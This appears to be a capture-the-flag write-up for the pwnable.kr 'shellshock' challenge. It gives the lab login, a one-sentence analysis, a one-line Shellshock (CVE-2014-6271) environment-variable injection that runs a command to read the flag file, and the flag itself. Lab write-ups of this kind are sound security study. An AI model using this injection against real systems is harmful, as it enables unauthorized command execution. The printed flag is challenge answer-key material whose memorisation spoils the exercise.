* Challenge

Mommy, there was a shocking news about bash.
I bet you already know, but lets just make it sure :)


ssh shellshock@pwnable.kr -p2222 (pw:guest)

* Analysis

The code starts bash and executes echo shock_me. By exploiting
shellshock we can inject a custom command that will cat the flag.

* Exploit

env x='() { :;}; /bin/cat flag' ./shellshock

* Flag

only if I knew CVE-2014-6271 ten years ago..!!
